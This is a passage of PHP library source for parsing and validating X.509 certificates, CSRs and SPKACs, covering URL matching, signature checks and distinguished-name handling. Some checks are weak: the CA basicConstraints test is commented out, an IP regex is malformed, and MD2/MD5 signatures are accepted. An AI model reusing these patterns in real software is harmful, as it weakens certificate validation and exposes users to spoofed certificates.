        //if (!$basicConstraints || !$basicConstraints['cA']) {
        //    return false;
        //}

        $this->CAs[] = $cert;

        $this->dn = $olddn;
        $this->currentCert = $oldcert;
        $this->signatureSubject = $oldsigsubj;

        return true;
    }

    /**
     * Validate an X.509 certificate against a URL
     *
     * From RFC2818 "HTTP over TLS":
     *
     * Matching is performed using the matching rules specified by
     * [RFC2459].  If more than one identity of a given type is present in
     * the certificate (e.g., more than one dNSName name, a match in any one
     * of the set is considered acceptable.) Names may contain the wildcard
     * character * which is considered to match any single domain name
     * component or component fragment. E.g., *.a.com matches foo.a.com but
     * not bar.foo.a.com. f*.com matches foo.com but not bar.com.
     *
     * @param string $url
     * @access public
     * @return bool
     */
    function validateURL($url)
    {
        if (!is_array($this->currentCert) || !isset($this->currentCert['tbsCertificate'])) {
            return false;
        }

        $components = parse_url($url);
        if (!isset($components['host'])) {
            return false;
        }

        if ($names = $this->getExtension('id-ce-subjectAltName')) {
            foreach ($names as $key => $value) {
                $value = str_replace(array('.', '*'), array('\.', '[^.]*'), $value);
                switch ($key) {
                    case 'dNSName':
                        /* From RFC2818 "HTTP over TLS":

                           If a subjectAltName extension of type dNSName is present, that MUST
                           be used as the identity. Otherwise, the (most specific) Common Name
                           field in the Subject field of the certificate MUST be used. Although
                           the use of the Common Name is existing practice, it is deprecated and
                           Certification Authorities are encouraged to use the dNSName instead. */
                        if (preg_match('#^' . $value . '$#', $components['host'])) {
                            return true;
                        }
                        break;
                    case 'iPAddress':
                        /* From RFC2818 "HTTP over TLS":

                           In some cases, the URI is specified as an IP address rather than a
                           hostname. In this case, the iPAddress subjectAltName must be present
                           in the certificate and must exactly match the IP in the URI. */
                        if (preg_match('#(?:\d{1-3}\.){4}#', $components['host'] . '.') && preg_match('#^' . $value . '$#', $components['host'])) {
                            return true;
                        }
                }
            }
            return false;
        }

        if ($value = $this->getDNProp('id-at-commonName')) {
            $value = str_replace(array('.', '*'), array('\.', '[^.]*'), $value[0]);
            return preg_match('#^' . $value . '$#', $components['host']);
        }

        return false;
    }

    /**
     * Validate a date
     *
     * If $date isn't defined it is assumed to be the current date.
     *
     * @param int $date optional
     * @access public
     */
    function validateDate($date = null)
    {
        if (!is_array($this->currentCert) || !isset($this->currentCert['tbsCertificate'])) {
            return false;
        }

        if (!isset($date)) {
            $date = time();
        }

        $notBefore = $this->currentCert['tbsCertificate']['validity']['notBefore'];
        $notBefore = isset($notBefore['generalTime']) ? $notBefore['generalTime'] : $notBefore['utcTime'];

        $notAfter = $this->currentCert['tbsCertificate']['validity']['notAfter'];
        $notAfter = isset($notAfter['generalTime']) ? $notAfter['generalTime'] : $notAfter['utcTime'];

        switch (true) {
            case $date < @strtotime($notBefore):
            case $date > @strtotime($notAfter):
                return false;
        }

        return true;
    }

    /**
     * Validate a signature
     *
     * Works on X.509 certs, CSR's and CRL's.
     * Returns true if the signature is verified, false if it is not correct or null on error
     *
     * By default returns false for self-signed certs. Call validateSignature(false) to make this support
     * self-signed.
     *
     * The behavior of this function is inspired by {@link http://php.net/openssl-verify openssl_verify}.
     *
     * @param bool $caonly optional
     * @access public
     * @return mixed
     */
    function validateSignature($caonly = true)
    {
        if (!is_array($this->currentCert) || !isset($this->signatureSubject)) {
            return null;
        }

        /* TODO:
           "emailAddress attribute values are not case-sensitive (e.g., "subscriber@example.com" is the same as "SUBSCRIBER@EXAMPLE.COM")."
            -- http://tools.ietf.org/html/rfc5280#section-4.1.2.6

           implement pathLenConstraint in the id-ce-basicConstraints extension */

        switch (true) {
            case isset($this->currentCert['tbsCertificate']):
                // self-signed cert
                switch (true) {
                    case !defined('FILE_X509_IGNORE_TYPE') && $this->currentCert['tbsCertificate']['issuer'] === $this->currentCert['tbsCertificate']['subject']:
                    case defined('FILE_X509_IGNORE_TYPE') && $this->getIssuerDN(FILE_X509_DN_STRING) === $this->getDN(FILE_X509_DN_STRING):
                        $authorityKey = $this->getExtension('id-ce-authorityKeyIdentifier');
                        $subjectKeyID = $this->getExtension('id-ce-subjectKeyIdentifier');
                        switch (true) {
                            case !is_array($authorityKey):
                            case is_array($authorityKey) && isset($authorityKey['keyIdentifier']) && $authorityKey['keyIdentifier'] === $subjectKeyID:
                                $signingCert = $this->currentCert; // working cert
                        }
                }

                if (!empty($this->CAs)) {
                    for ($i = 0; $i < count($this->CAs); $i++) {
                        // even if the cert is a self-signed one we still want to see if it's a CA;
                        // if not, we'll conditionally return an error
                        $ca = $this->CAs[$i];
                        switch (true) {
                            case !defined('FILE_X509_IGNORE_TYPE') && $this->currentCert['tbsCertificate']['issuer'] === $ca['tbsCertificate']['subject']:
                            case defined('FILE_X509_IGNORE_TYPE') && $this->getDN(FILE_X509_DN_STRING, $this->currentCert['tbsCertificate']['issuer']) === $this->getDN(FILE_X509_DN_STRING, $ca['tbsCertificate']['subject']):
                                $authorityKey = $this->getExtension('id-ce-authorityKeyIdentifier');
                                $subjectKeyID = $this->getExtension('id-ce-subjectKeyIdentifier', $ca);
                                switch (true) {
                                    case !is_array($authorityKey):
                                    case is_array($authorityKey) && isset($authorityKey['keyIdentifier']) && $authorityKey['keyIdentifier'] === $subjectKeyID:
                                        $signingCert = $ca; // working cert
                                        break 3;
                                }
                        }
                    }
                    if (count($this->CAs) == $i && $caonly) {
                        return false;
                    }
                } elseif (!isset($signingCert) || $caonly) {
                    return false;
                }
                return $this->_validateSignature(
                    $signingCert['tbsCertificate']['subjectPublicKeyInfo']['algorithm']['algorithm'],
                    $signingCert['tbsCertificate']['subjectPublicKeyInfo']['subjectPublicKey'],
                    $this->currentCert['signatureAlgorithm']['algorithm'],
                    substr(base64_decode($this->currentCert['signature']), 1),
                    $this->signatureSubject
                );
            case isset($this->currentCert['certificationRequestInfo']):
                return $this->_validateSignature(
                    $this->currentCert['certificationRequestInfo']['subjectPKInfo']['algorithm']['algorithm'],
                    $this->currentCert['certificationRequestInfo']['subjectPKInfo']['subjectPublicKey'],
                    $this->currentCert['signatureAlgorithm']['algorithm'],
                    substr(base64_decode($this->currentCert['signature']), 1),
                    $this->signatureSubject
                );
            case isset($this->currentCert['publicKeyAndChallenge']):
                return $this->_validateSignature(
                    $this->currentCert['publicKeyAndChallenge']['spki']['algorithm']['algorithm'],
                    $this->currentCert['publicKeyAndChallenge']['spki']['subjectPublicKey'],
                    $this->currentCert['signatureAlgorithm']['algorithm'],
                    substr(base64_decode($this->currentCert['signature']), 1),
                    $this->signatureSubject
                );
            case isset($this->currentCert['tbsCertList']):
                if (!empty($this->CAs)) {
                    for ($i = 0; $i < count($this->CAs); $i++) {
                        $ca = $this->CAs[$i];
                        switch (true) {
                            case !defined('FILE_X509_IGNORE_TYPE') && $this->currentCert['tbsCertList']['issuer'] === $ca['tbsCertificate']['subject']:
                            case defined('FILE_X509_IGNORE_TYPE') && $this->getDN(FILE_X509_DN_STRING, $this->currentCert['tbsCertList']['issuer']) === $this->getDN(FILE_X509_DN_STRING, $ca['tbsCertificate']['subject']):
                                $authorityKey = $this->getExtension('id-ce-authorityKeyIdentifier');
                                $subjectKeyID = $this->getExtension('id-ce-subjectKeyIdentifier', $ca);
                                switch (true) {
                                    case !is_array($authorityKey):
                                    case is_array($authorityKey) && isset($authorityKey['keyIdentifier']) && $authorityKey['keyIdentifier'] === $subjectKeyID:
                                        $signingCert = $ca; // working cert
                                        break 3;
                                }
                        }
                    }
                }
                if (!isset($signingCert)) {
                    return false;
                }
                return $this->_validateSignature(
                    $signingCert['tbsCertificate']['subjectPublicKeyInfo']['algorithm']['algorithm'],
                    $signingCert['tbsCertificate']['subjectPublicKeyInfo']['subjectPublicKey'],
                    $this->currentCert['signatureAlgorithm']['algorithm'],
                    substr(base64_decode($this->currentCert['signature']), 1),
                    $this->signatureSubject
                );
            default:
                return false;
        }
    }

    /**
     * Validates a signature
     *
     * Returns true if the signature is verified, false if it is not correct or null on error
     *
     * @param string $publicKeyAlgorithm
     * @param string $publicKey
     * @param string $signatureAlgorithm
     * @param string $signature
     * @param string $signatureSubject
     * @access private
     * @return int
     */
    function _validateSignature($publicKeyAlgorithm, $publicKey, $signatureAlgorithm, $signature, $signatureSubject)
    {
        switch ($publicKeyAlgorithm) {
            case 'rsaEncryption':
                if (!class_exists('Crypt_RSA')) {
                    include_once 'Crypt/RSA.php';
                }
                $rsa = new Crypt_RSA();
                $rsa->loadKey($publicKey);

                switch ($signatureAlgorithm) {
                    case 'md2WithRSAEncryption':
                    case 'md5WithRSAEncryption':
                    case 'sha1WithRSAEncryption':
                    case 'sha224WithRSAEncryption':
                    case 'sha256WithRSAEncryption':
                    case 'sha384WithRSAEncryption':
                    case 'sha512WithRSAEncryption':
                        $rsa->setHash(preg_replace('#WithRSAEncryption$#', '', $signatureAlgorithm));
                        $rsa->setSignatureMode(CRYPT_RSA_SIGNATURE_PKCS1);
                        if (!@$rsa->verify($signatureSubject, $signature)) {
                            return false;
                        }
                        break;
                    default:
                        return null;
                }
                break;
            default:
                return null;
        }

        return true;
    }

    /**
     * Reformat public keys
     *
     * Reformats a public key to a format supported by phpseclib (if applicable)
     *
     * @param string $algorithm
     * @param string $key
     * @access private
     * @return string
     */
    function _reformatKey($algorithm, $key)
    {
        switch ($algorithm) {
            case 'rsaEncryption':
                return
                    "-----BEGIN RSA PUBLIC KEY-----\r\n" .
                    // subjectPublicKey is stored as a bit string in X.509 certs.  the first byte of a bit string represents how many bits
                    // in the last byte should be ignored.  the following only supports non-zero stuff but as none of the X.509 certs Firefox
                    // uses as a cert authority actually use a non-zero bit I think it's safe to assume that none do.
                    chunk_split(base64_encode(substr(base64_decode($key), 1)), 64) .
                    '-----END RSA PUBLIC KEY-----';
            default:
                return $key;
        }
    }

    /**
     * Decodes an IP address
     *
     * Takes in a base64 encoded "blob" and returns a human readable IP address
     *
     * @param string $ip
     * @access private
     * @return string
     */
    function _decodeIP($ip)
    {
        $ip = base64_decode($ip);
        list(, $ip) = unpack('N', $ip);
        return long2ip($ip);
    }

    /**
     * Encodes an IP address
     *
     * Takes a human readable IP address into a base64-encoded "blob"
     *
     * @param string $ip
     * @access private
     * @return string
     */
    function _encodeIP($ip)
    {
        return base64_encode(pack('N', ip2long($ip)));
    }

    /**
     * "Normalizes" a Distinguished Name property
     *
     * @param string $propName
     * @access private
     * @return mixed
     */
    function _translateDNProp($propName)
    {
        switch (strtolower($propName)) {
            case 'id-at-countryname':
            case 'countryname':
            case 'c':
                return 'id-at-countryName';
            case 'id-at-organizationname':
            case 'organizationname':
            case 'o':
                return 'id-at-organizationName';
            case 'id-at-dnqualifier':
            case 'dnqualifier':
                return 'id-at-dnQualifier';
            case 'id-at-commonname':
            case 'commonname':
            case 'cn':
                return 'id-at-commonName';
            case 'id-at-stateorprovincename':
            case 'stateorprovincename':
            case 'state':
            case 'province':
            case 'provincename':
            case 'st':
                return 'id-at-stateOrProvinceName';
            case 'id-at-localityname':
            case 'localityname':
            case 'l':
                return 'id-at-localityName';
            case 'id-emailaddress':
            case 'emailaddress':
                return 'pkcs-9-at-emailAddress';
            case 'id-at-serialnumber':
            case 'serialnumber':
                return 'id-at-serialNumber';
            case 'id-at-postalcode':
            case 'postalcode':
                return 'id-at-postalCode';
            case 'id-at-streetaddress':
            case 'streetaddress':
                return 'id-at-streetAddress';
            case 'id-at-name':
            case 'name':
                return 'id-at-name';
            case 'id-at-givenname':
            case 'givenname':
                return 'id-at-givenName';
            case 'id-at-surname':
            case 'surname':
            case 'sn':
                return 'id-at-surname';
            case 'id-at-initials':
            case 'initials':
                return 'id-at-initials';
            case 'id-at-generationqualifier':
            case 'generationqualifier':
                return 'id-at-generationQualifier';
            case 'id-at-organizationalunitname':
            case 'organizationalunitname':
            case 'ou':
                return 'id-at-organizationalUnitName';
            case 'id-at-pseudonym':
            case 'pseudonym':
                return 'id-at-pseudonym';
            case 'id-at-title':
            case 'title':
                return 'id-at-title';
            case 'id-at-description':
            case 'description':
                return 'id-at-description';
            case 'id-at-role':
            case 'role':
                return 'id-at-role';
            case 'id-at-uniqueidentifier':
            case 'uniqueidentifier':
            case 'x500uniqueidentifier':
                return 'id-at-uniqueIdentifier';
            case 'postaladdress':
            case 'id-at-postaladdress':
                return 'id-at-postalAddress';
            default:
                return false;
        }
    }

    /**
     * Set a Distinguished Name property
     *
     * @param string $propName
     * @param mixed $propValue
     * @param string $type optional
     * @access public
     * @return bool
     */
    function setDNProp($propName, $propValue, $type = 'utf8String')
    {
        if (empty($this->dn)) {
            $this->dn = array('rdnSequence' => array());
        }

        if (($propName = $this->_translateDNProp($propName)) === false) {
            return false;
        }

        foreach ((array) $propValue as $v) {
            if (!is_array($v) && isset($type)) {
                $v = array($type => $v);
            }
            $this->dn['rdnSequence'][] = array(
                array(
                    'type' => $propName,
                    'value'=> $v
                )
            );
        }

        return true;
    }

    /**
     * Remove Distinguished Name properties
     *
     * @param string $propName
     * @access public
     */
    function removeDNProp($propName)
    {
        if (empty($this->dn)) {
            return;
        }

        if (($propName = $this->_translateDNProp($propName)) === false) {
            return;
        }

        $dn = &$this->dn['rdnSequence'];
        $size = count($dn);
        for ($i = 0; $i < $size; $i++) {
            if ($dn[$i][0]['type'] == $propName) {
                unset($dn[$i]);
            }
        }

        $dn = array_values($dn);
    }

    /**
     * Get Distinguished Name properties
     *
     * @param string $propName
     * @param array $dn optional
     * @param bool $withType optional
     * @return mixed
     * @access public
     */
    function getDNProp($propName, $dn = null, $withType = false)
    {
        if (!isset($dn)) {
            $dn = $this->dn;
        }

        if (empty($dn)) {
            return false;
        }

        if (($propName = $this->_translateDNProp($propName)) === false) {
            return false;
        }

        $asn1 = new File_ASN1();
        $asn1->loadOIDs($this->oids);
        $filters = array();
        $filters['value'] = array('type' => FILE_ASN1_TYPE_UTF8_STRING);
        $asn1->loadFilters($filters);
        $this->_mapOutDNs($dn, 'rdnSequence', $asn1);
        $dn = $dn['rdnSequence'];
        $result = array();
        for ($i = 0; $i < count($dn); $i++) {
            if ($dn[$i][0]['type'] == $propName) {
                $v = $dn[$i][0]['value'];
                if (!$withType) {
                    if (is_array($v)) {
                        foreach ($v as $type => $s) {
                            $type = array_search($type, $asn1->ANYmap, true);
                            if ($type !== false && isset($asn1->stringTypeSize[$type])) {
                                $s = $asn1->convert($s, $type);
                                if ($s !== false) {
                                    $v = $s;
                                    break;
                                }
                            }
                        }
                        if (is_array($v)) {
                            $v = array_pop($v); // Always strip data type.
                        }
                    } elseif (is_object($v) && strtolower(get_class($v)) == 'file_asn1_element') {
                        $map = $this->_getMapping($propName);
                        if (!is_bool($map)) {
                            $decoded = $asn1->decodeBER($v);
                            $v = $asn1->asn1map($decoded[0], $map);
                        }
                    }
                }
                $result[] = $v;
            }
        }

        return $result;
    }

    /**
     * Set a Distinguished Name
     *
     * @param mixed $dn
     * @param bool $merge optional
     * @param string $type optional
     * @access public
     * @return bool
     */
    function setDN($dn, $merge = false, $type = 'utf8String')
    {
        if (!$merge) {
            $this->dn = null;
        }

        if (is_array($dn)) {
            if (isset($dn['rdnSequence'])) {
                $this->dn = $dn; // No merge here.
                return true;
            }

            // handles stuff generated by openssl_x509_parse()
            foreach ($dn as $prop => $value) {
                if (!$this->setDNProp($prop, $value, $type)) {
                    return false;
                }
            }
            return true;
        }

        // handles everything else
        $results = preg_split('#((?:^|, *|/)(?:C=|O=|OU=|CN=|L=|ST=|SN=|postalCode=|streetAddress=|emailAddress=|serialNumber=|organizationalUnitName=|title=|description=|role=|x500UniqueIdentifier=|postalAddress=))#', $dn, -1, PREG_SPLIT_DELIM_CAPTURE);
        for ($i = 1; $i < count($results); $i+=2) {
            $prop = trim($results[$i], ', =/');
            $value = $results[$i + 1];
            if (!$this->setDNProp($prop, $value, $type)) {
                return false;
            }
        }

        return true;
    }

    /**
     * Get the Distinguished Name for a certificates subject
     *
     * @param mixed $format optional
     * @param array $dn optional
     * @access public
     * @return bool
     */
    function getDN($format = FILE_X509_DN_ARRAY, $dn = null)
    {
        if (!isset($dn)) {
            $dn = isset($this->currentCert['tbsCertList']) ? $this->currentCert['tbsCertList']['issuer'] : $this->dn;
        }

        switch ((int) $format) {
            case FILE_X509_DN_ARRAY:
                return $dn;
            case FILE_X509_DN_ASN1:
                $asn1 = new File_ASN1();
                $asn1->loadOIDs($this->oids);
                $filters = array();
                $filters['rdnSequence']['value'] = array('type' => FILE_ASN1_TYPE_UTF8_STRING);
                $asn1->loadFilters($filters);
                $this->_mapOutDNs($dn, 'rdnSequence', $asn1);
                return $asn1->encodeDER($dn, $this->Name);
            case FILE_X509_DN_CANON:
                //  No SEQUENCE around RDNs and all string values normalized as
                // trimmed lowercase UTF-8 with all spacing as one blank.
                // constructed RDNs will not be canonicalized
                $asn1 = new File_ASN1();
                $asn1->loadOIDs($this->oids);
                $filters = array();
                $filters['value'] = array('type' => FILE_ASN1_TYPE_UTF8_STRING);
                $asn1->loadFilters($filters);
                $result = '';
                $this->_mapOutDNs($dn, 'rdnSequence', $asn1);
                foreach ($dn['rdnSequence'] as $rdn) {
                    foreach ($rdn as $i => $attr) {
                        $attr = &$rdn[$i];
                        if (is_array($attr['value'])) {
                            foreach ($attr['value'] as $type => $v) {
                                $type = array_search($type, $asn1->ANYmap, true);
                                if ($type !== false && isset($asn1->stringTypeSize[$type])) {
                                    $v = $asn1->convert($v, $type);
                                    if ($v !== false) {
                                        $v = preg_replace('/\s+/', ' ', $v);
                                        $attr['value'] = strtolower(trim($v));
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    $result .= $asn1->encodeDER($rdn, $this->RelativeDistinguishedName);
                }
                return $result;
            case FILE_X509_DN_HASH:
                $dn = $this->getDN(FILE_X509_DN_CANON, $dn);
                if (!class_exists('Crypt_Hash')) {
                    include_once 'Crypt/Hash.php';
                }
                $hash = new Crypt_Hash('sha1');
                $hash = $hash->hash($dn);
                extract(unpack('Vhash', $hash));
                return strtolower(bin2hex(pack('N', $hash)));
        }

        // Default is to return a string.
        $start = true;
        $output = '';
        $result = array();
        $asn1 = new File_ASN1();
        $asn1->loadOIDs($this->oids);
        $filters = array();
        $filters['rdnSequence']['value'] = array('type' => FILE_ASN1_TYPE_UTF8_STRING);
        $asn1->loadFilters($filters);
        $this->_mapOutDNs($dn, 'rdnSequence', $asn1);
        foreach ($dn['rdnSequence'] as $field) {
            $prop = $field[0]['type'];
            $value = $field[0]['value'];

            $delim = ', ';
            switch ($prop) {
                case 'id-at-countryName':
                    $desc = 'C';
                    break;
                case 'id-at-stateOrProvinceName':
                    $desc = 'ST';
                    break;
                case 'id-at-organizationName':
                    $desc = 'O';
                    break;
                case 'id-at-organizationalUnitName':
                    $desc = 'OU';
                    break;
                case 'id-at-commonName':
                    $desc = 'CN';
                    break;
                case 'id-at-localityName':
                    $desc = 'L';
                    break;
                case 'id-at-surname':
                    $desc = 'SN';
                    break;
                case 'id-at-uniqueIdentifier':
                    $delim = '/';
                    $desc = 'x500UniqueIdentifier';
                    break;
                case 'id-at-postalAddress':
                    $delim = '/';
                    $desc = 'postalAddress';
                    break;
                default:
                    $delim = '/';
                    $desc = preg_replace('#.+-([^-]+)$#', '$1', $prop);
            }

            if (!$start) {
                $output.= $delim;
            }
            if (is_array($value)) {
                foreach ($value as $type => $v) {
                    $type = array_search($type, $asn1->ANYmap, true);
                    if ($type !== false && isset($asn1->stringTypeSize[$type])) {
                        $v = $asn1->convert($v, $type);
                        if ($v !== false) {
                            $value = $v;
                            break;
                        }
                    }
                }
                if (is_array($value)) {
                    $value = array_pop($value); // Always strip data type.
                }
            } elseif (is_object($value) && strtolower(get_class($value)) == 'file_asn1_element') {
                $callback = create_function('$x', 'return "\x" . bin2hex($x[0]);');
                $value = strtoupper(preg_replace_callback('#[^\x20-\x7E]#', $callback, $value->element));
            }
            $output.= $desc . '=' . $value;
            $result[$desc] = isset($result[$desc]) ?
                array_merge((array) $dn[$prop], array($value)) :
                $value;
            $start = false;
        }

        return $format == FILE_X509_DN_OPENSSL ? $result : $output;
    }

    /**
     * Get the Distinguished Name for a certificate/crl issuer
     *
     * @param int $format optional
     * @access public
     * @return mixed
     */
    function getIssuerDN($format = FILE_X509_DN_ARRAY)
    {
        switch (true) {
            case !isset($this->currentCert) || !is_array($this->currentCert):
                break;
            case isset($this->currentCert['tbsCertificate']):
                return $this->getDN($format, $this->currentCert['tbsCertificate']['issuer']);
            case isset($this->currentCert['tbsCertList']):
                return $this->getDN($format, $this->currentCert['tbsCertList']['issuer']);
        }

        return false;
    }

    /**
     * Get the Distinguished Name for a certificate/csr subject
     * Alias of getDN()
     *
     * @param int $format optional
     * @access public
     * @return mixed
     */
    function getSubjectDN($format = FILE_X509_DN_ARRAY)
    {
        switch (true) {
            case !empty($this->dn):
                return $this->getDN($format);
            case !isset($this->currentCert) || !is_array($this->currentCert):
                break;
            case isset($this->currentCert['tbsCertificate']):
                return $this->getDN($format, $this->currentCert['tbsCertificate']['subject']);
            case isset($this->currentCert['certificationRequestInfo']):
                return $this->getDN($format, $this->currentCert['certificationRequestInfo']['subject']);
        }

        return false;
    }

    /**
     * Get an individual Distinguished Name property for a certificate/crl issuer
     *
     * @param string $propName
     * @param bool $withType optional
     * @access public
     * @return mixed
     */
    function getIssuerDNProp($propName, $withType = false)
    {
        switch (true) {
            case !isset($this->currentCert) || !is_array($this->currentCert):
                break;
            case isset($this->currentCert['tbsCertificate']):
                return $this->getDNProp($propName, $this->currentCert['tbsCertificate']['issuer'], $withType);
            case isset($this->currentCert['tbsCertList']):
                return $this->getDNProp($propName, $this->currentCert['tbsCertList']['issuer'], $withType);
        }

        return false;
    }

    /**
     * Get an individual Distinguished Name property for a certificate/csr subject
     *
     * @param string $propName
     * @param bool $withType optional
     * @access public
     * @return mixed
     */
    function getSubjectDNProp($propName, $withType = false)
    {
        switch (true) {
            case !empty($this->dn):
                return $this->getDNProp($propName, null, $withType);
            case !isset($this->currentCert) || !is_array($this->currentCert):
                break;
            case isset($this->currentCert['tbsCertificate']):
                return $this->getDNProp($propName, $this->currentCert['tbsCertificate']['subject'], $withType);
            case isset($this->currentCert['certificationRequestInfo']):
                return $this->getDNProp($propName, $this->currentCert['certificationRequestInfo']['subject'], $withType);
        }

        return false;
    }

    /**
     * Get the certificate chain for the current cert
     *
     * @access public
     * @return mixed
     */
    function getChain()
    {
        $chain = array($this->currentCert);

        if (!is_array($this->currentCert) || !isset($this->currentCert['tbsCertificate'])) {
            return false;
        }
        if (empty($this->CAs)) {
            return $chain;
        }
        while (true) {
            $currentCert = $chain[count($chain) - 1];
            for ($i = 0; $i < count($this->CAs); $i++) {
                $ca = $this->CAs[$i];
                if ($currentCert['tbsCertificate']['issuer'] === $ca['tbsCertificate']['subject']) {
                    $authorityKey = $this->getExtension('id-ce-authorityKeyIdentifier', $currentCert);
                    $subjectKeyID = $this->getExtension('id-ce-subjectKeyIdentifier', $ca);
                    switch (true) {
                        case !is_array($authorityKey):
                        case is_array($authorityKey) && isset($authorityKey['keyIdentifier']) && $authorityKey['keyIdentifier'] === $subjectKeyID:
                            if ($currentCert === $ca) {
                                break 3;
                            }
                            $chain[] = $ca;
                            break 2;
                    }
                }
            }
            if ($i == count($this->CAs)) {
                break;
            }
        }
        foreach ($chain as $key => $value) {
            $chain[$key] = new File_X509();
            $chain[$key]->loadX509($value);
        }
        return $chain;
    }

    /**
     * Set public key
     *
     * Key needs to be a Crypt_RSA object
     *
     * @param object $key
     * @access public
     * @return bool
     */
    function setPublicKey($key)
    {
        $key->setPublicKey();
        $this->publicKey = $key;
    }

    /**
     * Set private key
     *
     * Key needs to be a Crypt_RSA object
     *
     * @param object $key
     * @access public
     */
    function setPrivateKey($key)
    {
        $this->privateKey = $key;
    }

    /**
     * Set challenge
     *
     * Used for SPKAC CSR's
     *
     * @param string $challenge
     * @access public
     */
    function setChallenge($challenge)
    {
        $this->challenge = $challenge;
    }

    /**
     * Gets the public key
     *
     * Returns a Crypt_RSA object or a false.
     *
     * @access public
     * @return mixed
     */
    function getPublicKey()
    {
        if (isset($this->publicKey)) {
            return $this->publicKey;
        }

        if (isset($this->currentCert) && is_array($this->currentCert)) {
            foreach (array('tbsCertificate/subjectPublicKeyInfo', 'certificationRequestInfo/subjectPKInfo') as $path) {
                $keyinfo = $this->_subArray($this->currentCert, $path);
                if (!empty($keyinfo)) {
                    break;
                }
            }
        }
        if (empty($keyinfo)) {
            return false;
        }

        $key = $keyinfo['subjectPublicKey'];

        switch ($keyinfo['algorithm']['algorithm']) {
            case 'rsaEncryption':
                if (!class_exists('Crypt_RSA')) {
                    include_once 'Crypt/RSA.php';
                }
                $publicKey = new Crypt_RSA();
                $publicKey->loadKey($key);
                $publicKey->setPublicKey();
                break;
            default:
                return false;
        }

        return $publicKey;
    }

    /**
     * Load a Certificate Signing Request
     *
     * @param string $csr
     * @access public
     * @return mixed
     */
    function loadCSR($csr, $mode = FILE_X509_FORMAT_AUTO_DETECT)
    {
        if (is_array($csr) && isset($csr['certificationRequestInfo'])) {
            unset($this->currentCert);
            unset($this->currentKeyIdentifier);
            unset($this->signatureSubject);
            $this->dn = $csr['certificationRequestInfo']['subject'];
            if (!isset($this->dn)) {
                return false;
            }

            $this->currentCert = $csr;
            return $csr;
        }

        // see http://tools.ietf.org/html/rfc2986

        $asn1 = new File_ASN1();

        if ($mode != FILE_X509_FORMAT_DER) {
            $newcsr = $this->_extractBER($csr);
            if ($mode == FILE_X509_FORMAT_PEM && $csr == $newcsr) {
                return false;
            }
            $csr = $newcsr;
        }
        $orig = $csr;

        if ($csr === false) {
            $this->currentCert = false;
            return false;
        }

        $asn1->loadOIDs($this->oids);
        $decoded = $asn1->decodeBER($csr);

        if (empty($decoded)) {
            $this->currentCert = false;
            return false;
        }

        $csr = $asn1->asn1map($decoded[0], $this->CertificationRequest);
        if (!isset($csr) || $csr === false) {
            $this->currentCert = false;
            return false;
        }

        $this->_mapInAttributes($csr, 'certificationRequestInfo/attributes', $asn1);
        $this->_mapInDNs($csr, 'certificationRequestInfo/subject/rdnSequence', $asn1);

        $this->dn = $csr['certificationRequestInfo']['subject'];

        $this->signatureSubject = substr($orig, $decoded[0]['content'][0]['start'], $decoded[0]['content'][0]['length']);

        $algorithm = &$csr['certificationRequestInfo']['subjectPKInfo']['algorithm']['algorithm'];
        $key = &$csr['certificationRequestInfo']['subjectPKInfo']['subjectPublicKey'];
        $key = $this->_reformatKey($algorithm, $key);

        switch ($algorithm) {
            case 'rsaEncryption':
                if (!class_exists('Crypt_RSA')) {
                    include_once 'Crypt/RSA.php';
                }
                $this->publicKey = new Crypt_RSA();
                $this->publicKey->loadKey($key);
                $this->publicKey->setPublicKey();
                break;
            default:
                $this->publicKey = null;
        }

        $this->currentKeyIdentifier = null;
        $this->currentCert = $csr;

        return $csr;
    }

    /**
     * Save CSR request
     *
     * @param array $csr
     * @param int $format optional
     * @access public
     * @return string
     */
    function saveCSR($csr, $format = FILE_X509_FORMAT_PEM)
    {
        if (!is_array($csr) || !isset($csr['certificationRequestInfo'])) {
            return false;
        }

        switch (true) {
            case !($algorithm = $this->_subArray($csr, 'certificationRequestInfo/subjectPKInfo/algorithm/algorithm')):
            case is_object($csr['certificationRequestInfo']['subjectPKInfo']['subjectPublicKey']):
                break;
            default:
                switch ($algorithm) {
                    case 'rsaEncryption':
                        $csr['certificationRequestInfo']['subjectPKInfo']['subjectPublicKey']
                            = base64_encode("\0" . base64_decode(preg_replace('#-.+-|[\r\n]#', '', $csr['certificationRequestInfo']['subjectPKInfo']['subjectPublicKey'])));
                        $csr['certificationRequestInfo']['subjectPKInfo']['algorithm']['parameters'] = null;
                        $csr['signatureAlgorithm']['parameters'] = null;
                        $csr['certificationRequestInfo']['signature']['parameters'] = null;
                }
        }

        $asn1 = new File_ASN1();

        $asn1->loadOIDs($this->oids);

        $filters = array();
        $filters['certificationRequestInfo']['subject']['rdnSequence']['value']
            = array('type' => FILE_ASN1_TYPE_UTF8_STRING);

        $asn1->loadFilters($filters);

        $this->_mapOutDNs($csr, 'certificationRequestInfo/subject/rdnSequence', $asn1);
        $this->_mapOutAttributes($csr, 'certificationRequestInfo/attributes', $asn1);
        $csr = $asn1->encodeDER($csr, $this->CertificationRequest);

        switch ($format) {
            case FILE_X509_FORMAT_DER:
                return $csr;
            // case FILE_X509_FORMAT_PEM:
            default:
                return "-----BEGIN CERTIFICATE REQUEST-----\r\n" . chunk_split(base64_encode($csr), 64) . '-----END CERTIFICATE REQUEST-----';
        }
    }

    /**
     * Load a SPKAC CSR
     *
     * SPKAC's are produced by the HTML5 keygen element:
     *
     * https://developer.mozilla.org/en-US/docs/HTML/Element/keygen
     *
     * @param string $csr
     * @access public
     * @return mixed
     */
    function loadSPKAC($spkac)
    {
        if (is_array($spkac) && isset($spkac['publicKeyAndChallenge'])) {
            unset($this->currentCert);
            unset($this->currentKeyIdentifier);
            unset($this->signatureSubject);
            $this->currentCert = $spkac;
            return $spkac;
        }

        // see http://www.w3.org/html/wg/drafts/html/master/forms.html#signedpublickeyandchallenge

        $asn1 = new File_ASN1();

        // OpenSSL produces SPKAC's that are preceded by the string SPKAC=
        $temp = preg_replace('#(?:SPKAC=)|[ \r\n\\\]#', '', $spkac);
        $temp = preg_match('#^[a-zA-Z\d/+]*={0,2}$#', $temp) ? base64_decode($temp) : false;
        if ($temp != false) {
            $spkac = $temp;
        }
        $orig = $spkac;

        if ($spkac === false) {
            $this->currentCert = false;
            return false;
        }

        $asn1->loadOIDs($this->oids);
        $decoded = $asn1->decodeBER($spkac);

        if (empty($decoded)) {
            $this->currentCert = false;
            return false;
        }

        $spkac = $asn1->asn1map($decoded[0], $this->SignedPublicKeyAndChallenge);

        if (!isset($spkac) || $spkac === false) {
            $this->currentCert = false;
            return false;
        }

